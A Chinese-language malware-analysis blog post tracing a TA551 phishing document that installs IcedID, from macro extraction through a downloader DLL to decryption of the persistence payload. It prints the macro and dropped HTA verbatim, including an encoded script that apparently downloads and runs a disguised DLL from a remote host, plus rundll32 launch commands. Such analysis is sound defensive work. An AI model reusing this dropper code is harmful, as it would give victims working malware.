<!DOCTYPE html><html lang="zh-CN"><head><meta charset="utf-8"><meta name="X-UA-Compatible" content="IE=edge"><meta name="author" content="scr1pt"><title>bokbot-analysis · scr1pt's blog</title><meta name="description" content="2021-12-10 (FRIDAY) - TA551 (SHATHAK) ICEDID (BOKBOT) WITH COBALT STRIKE AND DARK VNChttps://www.malware-traffic-analysis.net/2021/12/10/index.html


"><meta name="keywords" content="Blog,博客,Hexo"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="renderer" content="webkit"><link rel="shortcut icon" type="image/x-icon" href="/images/scr1pt.jpg"><link rel="stylesheet" href="/css/style.css"><link rel="stylesheet" href="/css/blog_basic.css"><link rel="stylesheet" href="/css/font-awesome.min.css"><link rel="stylesheet" href="/css/insight.css"><link rel="stylesheet" href="/css/search.css"><link rel="alternate" type="application/atom+xml" title="ATOM 1.0" href="/atom.xml"><script src="/js/jquery.js"></script><meta name="generator" content="Hexo 6.1.0"></head><body><div class="page-top animated fadeInDown"><div class="nav"><li> <a href="/">Home</a></li><li> <a href="/archives">Archives</a></li><li> <a href="/tags">Tags</a></li><li> <a href="/about">About</a></li><li> <a href="/links">Links</a></li></div><div class="information"><div class="nav_right_btn"><li><a class="fa fa-chevron-left" onclick="window.history.go(-1)"> </a></li><li><a class="fa fa-search" onclick="openWindow();"></a></li></div><div class="avatar"><img src="/images/scr1pt.jpg"></div></div></div><div class="sidebar animated fadeInDown"><div class="sidebar-top"><div class="logo-title"><div class="title"><img src="/images/scr1pt.jpg" style="width:200px;" alt="favicon"><h3 title=""><a href="/">scr1pt's blog</a></h3><div class="description"><p>my dear virus, please fuck me</p></div></div><ul class="social-links"><li><a target="_blank" rel="noopener" href="https://github.com/scr1pt-kid"><i class="fa fa-github"></i></a></li><li><a href="mailto:2466811523@qq.com"><i class="fa fa-envelope"></i></a></li><li><a target="_blank" rel="noopener" href="http://sighttp.qq.com/authd?IDKEY=2466811523"><i class="fa fa-qq"></i></a></li></ul></div></div><div class="footer"><div class="p"> <span> 全站CC-BY-SA-3.0 </span><i class="fa fa-star"></i><span> scr1pt</span></div><div class="by_farbox"><span>Powered by </span><a href="https://hexo.io/zh-cn/" target="_blank">Hexo </a><span> & </span><span>Anatolo </span></div><div class="beian"></div></div></div><div class="main"><div class="autopagerize_page_element"><div class="content"><div class="post-page"><div class="post animated fadeInDown"><div class="post-title"><h3><a>bokbot-analysis</a></h3></div><div class="post-content"><p><h1 id="2021-12-10-FRIDAY-TA551-SHATHAK-ICEDID-BOKBOT-WITH-COBALT-STRIKE-AND-DARK-VNC"><a href="#2021-12-10-FRIDAY-TA551-SHATHAK-ICEDID-BOKBOT-WITH-COBALT-STRIKE-AND-DARK-VNC" class="headerlink" title="2021-12-10 (FRIDAY) - TA551 (SHATHAK) ICEDID (BOKBOT) WITH COBALT STRIKE AND DARK VNC"></a>2021-12-10 (FRIDAY) - TA551 (SHATHAK) ICEDID (BOKBOT) WITH COBALT STRIKE AND DARK VNC</h1><p><a target="_blank" rel="noopener" href="https://www.malware-traffic-analysis.net/2021/12/10/index.html">https://www.malware-traffic-analysis.net/2021/12/10/index.html</a></p>
<p><img src="https://scr1pt-1302658871.cos.ap-chengdu.myqcloud.com/img/FGSeYrxX0AMNOla.jpg" alt="Tweets with replies by Cryptolaemus (@Cryptolaemus1) / Twitter"></p>
<span id="more"></span>

<p>邮件附件带有加密的压缩包，密码为<code>ujy55</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python oledump.py -s a -v rule.12.21.doc</span><br></pre></td></tr></table></figure>

<p>得到代码</p>
<figure class="highlight vbscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">Attribute VB_Name = <span class="string">&quot;ThisDocument&quot;</span></span><br><span class="line">Attribute VB_Base = <span class="string">&quot;1Normal.ThisDocument&quot;</span></span><br><span class="line">Attribute VB_GlobalNameSpace = <span class="literal">False</span></span><br><span class="line">Attribute VB_Creatable = <span class="literal">False</span></span><br><span class="line">Attribute VB_PredeclaredId = <span class="literal">True</span></span><br><span class="line">Attribute VB_Exposed = <span class="literal">True</span></span><br><span class="line">Attribute VB_TemplateDerived = <span class="literal">True</span></span><br><span class="line">Attribute VB_Customizable = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">Function</span> contents()</span><br><span class="line">ActiveDocument.Content.Find.<span class="keyword">Execute</span> FindText:=<span class="string">&quot;x8&quot;</span>, ReplaceWith:=<span class="string">&quot;&quot;</span>, Replace:=<span class="number">2</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Function</span></span><br><span class="line"><span class="keyword">Function</span> text1(doorLikeLike)</span><br><span class="line">text1 = ActiveDocument.BuiltInDocumentProperties(doorLikeLike).Value</span><br><span class="line">contents</span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Function</span></span><br><span class="line"><span class="keyword">Public</span> <span class="keyword">Function</span> s(likeLikeLoad, karolNextLove)</span><br><span class="line"><span class="built_in">CreateObject</span>(text1(<span class="string">&quot;category&quot;</span>)).exec <span class="string">&quot;c:\windows\explorer &quot;</span> + karolNextLove</span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Function</span></span><br><span class="line">Attribute VB_Name = <span class="string">&quot;main&quot;</span></span><br><span class="line"><span class="keyword">Public</span> <span class="keyword">Sub</span> autoopen()</span><br><span class="line">youTubePow = StrReverse(ThisDocument.text1(<span class="string">&quot;keywords&quot;</span>))</span><br><span class="line"><span class="keyword">With</span> ActiveDocument</span><br><span class="line">.SaveAs FileName:=youTubePow, FileFormat:=<span class="number">2</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">With</span></span><br><span class="line">ThisDocument.s <span class="string">&quot;&quot;</span>, youTubePow</span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Sub</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>生成文件<code>likePowLike.hta</code></p>
<p><img src="https://scr1pt-1302658871.cos.ap-chengdu.myqcloud.com/img/image-20211220144826942.png" alt="image-20211220144826942"></p>
<p>那么我们文件的生成其实是一个解混淆的方法</p>
<figure class="highlight vbscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Function</span> contents()</span><br><span class="line">ActiveDocument.Content.Find.<span class="keyword">Execute</span> FindText:=<span class="string">&quot;x8&quot;</span>, ReplaceWith:=<span class="string">&quot;&quot;</span>, Replace:=<span class="number">2</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Function</span></span><br></pre></td></tr></table></figure>

<p>真正的文本在word中隐藏了，我们全选更改颜色后即可显示出来。</p>
<p>得到文件内容</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">  &lt;body&gt;</span><br><span class="line">    &lt;p id=&quot;doorLikeGirl&quot; style=&quot;font-color: #000&quot;&gt;eval&lt;/p&gt;</span><br><span class="line">    &lt;p id=&quot;dowGirlDow&quot; style=&quot;font-color: #000&quot;&gt;</span><br><span class="line">      fX17KWUoaGN0YWN9O2Vzb2xjLmVraUxkYW9MZXZvbDspMiAsImdwai5kYW9MZWtpTGRhb2xcXGNpbGJ1cFxcc3Jlc3VcXDpjIihlbGlmb3RldmFzLmVraUxkYW9MZXZvbDspeWRvYmVzbm9wc2VyLmVidVRyb29EdW95KGV0aXJ3LmVraUxkYW9MZXZvbDsxID0gZXB5dC5la2lMZGFvTGV2b2w7bmVwby5la2lMZGFvTGV2b2w7KSJtYWVydHMuYmRvZGEiKHRjZWpiT1hldml0Y0Egd2VuID0gZWtpTGRhb0xldm9sIHJhdnt5cnR7KTAwMiA9PSBzdXRhdHMuZWJ1VHJvb0R1b3koZmk7KShkbmVzLmVidVRyb29EdW95Oyllc2xhZiAsIlVNdzVpdmN4NXk2WU9Cd049cmVzdSZUSE14R3BJYjVjPXEmNENiTnlvQnFJSnVoMms5TEFqbU1UbG49JjF6bUl4RDVRSlNIRVNHY2lMWDlxPWRpYyZkbDNYaTZjb1FJcW92dGJacWFrSGkyanplVTA3PWRpJm91Y0hVQ0gwSHM9ZW1pdCZGaTVMb3NhQWk0ak94VnFZTGhXNjlXST1lZ2FwJmNUc0toNmRabnBKRD1lZ2FwJllIVmVPZUgwcHBHYXg3cW89cmVzdT83YXBlci81aEw4eTJXc0dYWXNMclZoenBqQi85ejJUMFFKSVNBaURqcVo0a3hCVXVBcXpOSWRYTS90dW1vMnJGUDJHSG1uSjZpdUMwb2ZTNlg1eHdKVDhXMjVIdkN5L05KbWNrdTEvZWhyZi9tb2MuZ3RpZmVuZWJkbmFsZXBvYy8vOnB0dGgiICwiVEVHIihuZXBvLmVidVRyb29EdW95OykicHR0aGxteC4ybG14c20iKHRjZWpiT1hldml0Y0Egd2VuID0gZWJ1VHJvb0R1b3kgcmF2---OykiZ3BqLmRhb0xla2lMZGFvbFxcY2lsYnVwXFxzcmVzdVxcOmMgMjNydnNnZXIiKG51ci5yb29Ed29QbHJpZzspInRjZWpib21ldHN5c2VsaWYuZ25pdHBpcmNzIih0Y2VqYk9YZXZpdGNBIHdlbiA9IGVidVRldm9Md29kIHJhdjspImxsZWhzLnRwaXJjc3ciKHRjZWpiT1hldml0Y0Egd2VuID0gcm9vRHdvUGxyaWcgcmF2</span><br><span class="line">    &lt;/p&gt;</span><br><span class="line">    &lt;p id=&quot;nextLoveLove&quot; style=&quot;font-color: #fff&quot;&gt;</span><br><span class="line">      ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=</span><br><span class="line">    &lt;/p&gt;</span><br><span class="line">    &lt;script language=&quot;javascript&quot;&gt;</span><br><span class="line">      function likeTubeDoor(loadPowGirl) &#123;</span><br><span class="line">        return new ActiveXObject(loadPowGirl);</span><br><span class="line">      &#125;</span><br><span class="line">      function loadDowNext(karolLoadLike) &#123;</span><br><span class="line">        return likeNextLoad.getElementById(karolLoadLike).innerHTML;</span><br><span class="line">      &#125;</span><br><span class="line">      function karolKarolLike(loadLikePow) &#123;</span><br><span class="line">        return &quot;cha&quot; + loadLikePow;</span><br><span class="line">      &#125;</span><br><span class="line">      function doorDowKarol(likeLoveGirl) &#123;</span><br><span class="line">        var doorPowNext = loadDowNext(&quot;nextLoveLove&quot;);</span><br><span class="line">        var likeLikeLike = &quot;&quot;;</span><br><span class="line">        var dowPowYou, tubeDoorLoad, doorLikePow;</span><br><span class="line">        var girlLoadNext, youGirlDoor, nextDoorPow, loadNextLike;</span><br><span class="line">        var youLoveLoad = 0;</span><br><span class="line">        likeLoveGirl = likeLoveGirl.replace(/[^A-Za-z0-9\+\/\=]/g, &quot;&quot;);</span><br><span class="line">        while (youLoveLoad &lt; likeLoveGirl.length) &#123;</span><br><span class="line">          girlLoadNext = doorPowNext.indexOf(</span><br><span class="line">            likeLoveGirl.charAt(youLoveLoad++)</span><br><span class="line">          );</span><br><span class="line">          youGirlDoor = doorPowNext.indexOf(likeLoveGirl.charAt(youLoveLoad++));</span><br><span class="line">          nextDoorPow = doorPowNext.indexOf(likeLoveGirl.charAt(youLoveLoad++));</span><br><span class="line">          loadNextLike = doorPowNext.indexOf(</span><br><span class="line">            likeLoveGirl.charAt(youLoveLoad++)</span><br><span class="line">          );</span><br><span class="line">          dowPowYou = (girlLoadNext &lt;&lt; 2) | (youGirlDoor &gt;&gt; 4);</span><br><span class="line">          tubeDoorLoad = ((youGirlDoor &amp; 15) &lt;&lt; 4) | (nextDoorPow &gt;&gt; 2);</span><br><span class="line">          doorLikePow = ((nextDoorPow &amp; 3) &lt;&lt; 6) | loadNextLike;</span><br><span class="line">          likeLikeLike = likeLikeLike + String.fromCharCode(dowPowYou);</span><br><span class="line">          if (nextDoorPow != 64) &#123;</span><br><span class="line">            likeLikeLike = likeLikeLike + String.fromCharCode(tubeDoorLoad);</span><br><span class="line">          &#125;</span><br><span class="line">          if (loadNextLike != 64) &#123;</span><br><span class="line">            likeLikeLike = likeLikeLike + String.fromCharCode(doorLikePow);</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        return likeLikeLike;</span><br><span class="line">      &#125;</span><br><span class="line">      function loadLikeDow(girlPowYou) &#123;</span><br><span class="line">        return girlPowYou.split(&quot;&quot;).reverse().join(&quot;&quot;);</span><br><span class="line">      &#125;</span><br><span class="line">      function loveGirlDow(loadLikePow) &#123;</span><br><span class="line">        return loadLikeDow(doorDowKarol(loadLikePow));</span><br><span class="line">      &#125;</span><br><span class="line">      function doorYouTube(loadLikePow, loadDoorPow) &#123;</span><br><span class="line">        return loadLikePow.split(loadDoorPow);</span><br><span class="line">      &#125;</span><br><span class="line">      likeDoorKarol = window;</span><br><span class="line">      likeNextLoad = document;</span><br><span class="line">      likeDoorKarol[&quot;moveTo&quot;](-101, -102);</span><br><span class="line">      var youDowLoad = loadDowNext(&quot;dowGirlDow&quot;).split(&quot;---&quot;);</span><br><span class="line">      var doorTubeLoad = loveGirlDow(youDowLoad[0]);</span><br><span class="line">      var loadLoadGirl = loveGirlDow(youDowLoad[1]);</span><br><span class="line">    &lt;/script&gt;</span><br><span class="line">    &lt;script language=&quot;javascript&quot;&gt;</span><br><span class="line">      function doorPowKarol(nextLoadYou) &#123;</span><br><span class="line">        likeDoorKarol[loadDowNext(&quot;doorLikeGirl&quot;)](nextLoadYou);</span><br><span class="line">      &#125;</span><br><span class="line">    &lt;/script&gt;</span><br><span class="line">    &lt;script language=&quot;vbscript&quot;&gt;</span><br><span class="line">      Call doorPowKarol(doorTubeLoad) : Call doorPowKarol(loadLoadGirl)</span><br><span class="line">    &lt;/script&gt;</span><br><span class="line">    &lt;script language=&quot;javascript&quot;&gt;</span><br><span class="line">      likeDoorKarol[&quot;close&quot;]();</span><br><span class="line">    &lt;/script&gt;</span><br><span class="line">  &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>那么很明显是一个base64解密的过程，我们直接拿出来解密得到攻击代码</p>
<p><img src="https://scr1pt-1302658871.cos.ap-chengdu.myqcloud.com/img/image-20211220145903187.png" alt="image-20211220145903187"></p>
<p>从这个代码中可以得到<code>loadLikeLoad.jpg</code>,然后使用regsvr32 执行该文件,可以知道此为dll</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">file loadLikeLoad.jpg</span><br><span class="line">loadLikeLoad.jpg: PE32+ executable (DLL) (native) x86-64, for MS Windows</span><br></pre></td></tr></table></figure>

<p><img src="https://scr1pt-1302658871.cos.ap-chengdu.myqcloud.com/img/image-20211220150700855.png" alt="image-20211220150700855"></p>
<h3 id="first-得到PE文件"><a href="#first-得到PE文件" class="headerlink" title="first 得到PE文件"></a>first 得到PE文件</h3><p><img src="https://scr1pt-1302658871.cos.ap-chengdu.myqcloud.com/img/image-20211220151227874.png" alt="image-20211220151227874"></p>
<p>那么是如何调用PE的呢？我们可以在函数中找到<code>call eax</code></p>
<p><img src="https://scr1pt-1302658871.cos.ap-chengdu.myqcloud.com/img/image-20211220154400313.png" alt="image-20211220154400313"></p>
<p>调用了dllmain函数</p>
<p><img src="https://scr1pt-1302658871.cos.ap-chengdu.myqcloud.com/img/image-20211220173322714.png" alt="image-20211220173322714"></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> __int64 v3; <span class="comment">// rbx</span></span><br><span class="line">  __int64 v4; <span class="comment">// rdi</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v5; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v6; <span class="comment">// eax</span></span><br><span class="line">  __int64 v7; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v8; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">void</span> *v9; <span class="comment">// rbx</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v10; <span class="comment">// edi</span></span><br><span class="line">  HANDLE ProcessHeap; <span class="comment">// rax</span></span><br><span class="line">  __int64 v12; <span class="comment">// rax</span></span><br><span class="line">  CHAR v14[<span class="number">32</span>]; <span class="comment">// [rsp+20h] [rbp-49h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v15[<span class="number">64</span>]; <span class="comment">// [rsp+40h] [rbp-29h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v16; <span class="comment">// [rsp+80h] [rbp+17h]</span></span><br><span class="line">  <span class="type">char</span> v17[<span class="number">60</span>]; <span class="comment">// [rsp+84h] [rbp+1Bh] BYREF</span></span><br><span class="line">  LPVOID lpMem; <span class="comment">// [rsp+D0h] [rbp+67h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v19; <span class="comment">// [rsp+D8h] [rbp+6Fh] BYREF</span></span><br><span class="line"></span><br><span class="line">  v3 = <span class="number">0</span>i64;</span><br><span class="line">  v4 = <span class="number">4</span>i64;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    v5 = __rdtsc();</span><br><span class="line">    v3 = v5 | (v3 &lt;&lt; <span class="number">16</span>);</span><br><span class="line">    Sleep(v3 &amp; <span class="number">15</span>);</span><br><span class="line">    --v4;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( v4 );</span><br><span class="line">  wsprintfA(v14, <span class="string">&quot;%016IX&quot;</span>, v3);</span><br><span class="line">  decrypt(v15);</span><br><span class="line">  v6 = sub_242A40();</span><br><span class="line">  v7 = sub_24160C(v16, v6, v14);</span><br><span class="line">  <span class="keyword">if</span> ( v7 &amp;&amp; sub_241FC0(v17, v7, &amp;lpMem, &amp;v19) &amp;&amp; v19 &gt;= <span class="number">0x400</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v8 = sub_24233C(lpMem);</span><br><span class="line">    v9 = lpMem;</span><br><span class="line">    v10 = v8;</span><br><span class="line">    <span class="keyword">if</span> ( lpMem )</span><br><span class="line">    &#123;</span><br><span class="line">      ProcessHeap = GetProcessHeap();</span><br><span class="line">      HeapFree(ProcessHeap, <span class="number">0</span>, v9);</span><br><span class="line">    &#125;</span><br><span class="line">    v12 = sub_2422C4(v14, v10);</span><br><span class="line">    <span class="keyword">if</span> ( v12 )</span><br><span class="line">      sub_241828(v17, v12);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;<span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> __int64 v3; <span class="comment">// rbx</span></span><br><span class="line">  __int64 v4; <span class="comment">// rdi</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v5; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v6; <span class="comment">// eax</span></span><br><span class="line">  __int64 v7; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v8; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">void</span> *v9; <span class="comment">// rbx</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v10; <span class="comment">// edi</span></span><br><span class="line">  HANDLE ProcessHeap; <span class="comment">// rax</span></span><br><span class="line">  __int64 v12; <span class="comment">// rax</span></span><br><span class="line">  CHAR v14[<span class="number">32</span>]; <span class="comment">// [rsp+20h] [rbp-49h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v15[<span class="number">64</span>]; <span class="comment">// [rsp+40h] [rbp-29h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v16; <span class="comment">// [rsp+80h] [rbp+17h]</span></span><br><span class="line">  <span class="type">char</span> v17[<span class="number">60</span>]; <span class="comment">// [rsp+84h] [rbp+1Bh] BYREF</span></span><br><span class="line">  LPVOID lpMem; <span class="comment">// [rsp+D0h] [rbp+67h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v19; <span class="comment">// [rsp+D8h] [rbp+6Fh] BYREF</span></span><br><span class="line"></span><br><span class="line">  v3 = <span class="number">0</span>i64;</span><br><span class="line">  v4 = <span class="number">4</span>i64;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    v5 = __rdtsc();</span><br><span class="line">    v3 = v5 | (v3 &lt;&lt; <span class="number">16</span>);</span><br><span class="line">    Sleep(v3 &amp; <span class="number">15</span>);</span><br><span class="line">    --v4;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( v4 );</span><br><span class="line">  wsprintfA(v14, <span class="string">&quot;%016IX&quot;</span>, v3);</span><br><span class="line">  decrypt(v15);</span><br><span class="line">  v6 = sub_242A40();</span><br><span class="line">  v7 = sub_24160C(v16, v6, v14);</span><br><span class="line">  <span class="keyword">if</span> ( v7 &amp;&amp; sub_241FC0(v17, v7, &amp;lpMem, &amp;v19) &amp;&amp; v19 &gt;= <span class="number">0x400</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v8 = sub_24233C(lpMem);</span><br><span class="line">    v9 = lpMem;</span><br><span class="line">    v10 = v8;</span><br><span class="line">    <span class="keyword">if</span> ( lpMem )</span><br><span class="line">    &#123;</span><br><span class="line">      ProcessHeap = GetProcessHeap();</span><br><span class="line">      HeapFree(ProcessHeap, <span class="number">0</span>, v9);</span><br><span class="line">    &#125;</span><br><span class="line">    v12 = sub_2422C4(v14, v10);</span><br><span class="line">    <span class="keyword">if</span> ( v12 )</span><br><span class="line">      sub_241828(v17, v12);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>其中有一个加密数据段，保存了访问的url地址</p>
<p><img src="https://scr1pt-1302658871.cos.ap-chengdu.myqcloud.com/img/image-20211221194838590.png" alt="image-20211221194838590"></p>
<p>解密后得到地址如下</p>
<p><img src="https://scr1pt-1302658871.cos.ap-chengdu.myqcloud.com/img/image-20211221194743507.png" alt="image-20211221194743507"></p>
<h3 id="next-get-url"><a href="#next-get-url" class="headerlink" title="next get url"></a>next get url</h3><p>这个dll的作用是下载持久化dll，当我们运行该dll时</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;C:\Windows\System32\rundll32.exe&quot; &quot;C:\Users\Scr1pt\Desktop\1\gg.dll&quot; #1</span><br></pre></td></tr></table></figure>

<p><img src="https://scr1pt-1302658871.cos.ap-chengdu.myqcloud.com/img/image-20211221192018140.png" alt="image-20211221192018140"></p>
<p>首先会去访问<code>aws.amazon.com</code></p>
<p><img src="https://scr1pt-1302658871.cos.ap-chengdu.myqcloud.com/img/image-20211221194059212.png" alt="image-20211221194059212"></p>
<p>然后会去访问主机获得<code>IcedID installer</code></p>
<p><img src="https://scr1pt-1302658871.cos.ap-chengdu.myqcloud.com/img/image-20211221195126150.png" alt="image-20211221195126150"></p>
<p>也即是<code>2021-12-10-binary-from-jeliskvosh.com.bin</code>文件,gziploader解密。</p>
<p><img src="https://scr1pt-1302658871.cos.ap-chengdu.myqcloud.com/img/image-20211221202210040.png" alt="image-20211221202210040"></p>
<p>然后利用<code>rundll32.exe [filename],DllMain --fi=&quot;[path to license.dat]&quot;</code>去调用license.dat持久化</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;C:\Windows\System32\rundll32.exe&quot; &quot;C:\Users\Scr1pt\Desktop\WrongEvolve\usage_x32.dat&quot;,DllMain --fi=&quot;C:\Users\Scr1pt\Desktop\WrongEvolve\license.dat&quot;</span><br></pre></td></tr></table></figure>

<p>原先预想调试一下，发现run不起来，望有大佬赐教。</p>
<h3 id="decrypt-license-dat"><a href="#decrypt-license-dat" class="headerlink" title="decrypt license.dat"></a>decrypt license.dat</h3><p>利用Binary Defender编写的脚本进行解密</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 IceDecrypt.py -f license.dat</span><br></pre></td></tr></table></figure>

<p>得到解密后的dll文件，后续就是窃取电脑上的各类信息了。</p>
<p><img src="https://scr1pt-1302658871.cos.ap-chengdu.myqcloud.com/img/image-20211222112425475.png" alt="image-20211222112425475"></p>
<p>有大量的加密数据，其实是通过rol、ror进行加密的，我们进行解密即可得到原数据。</p>
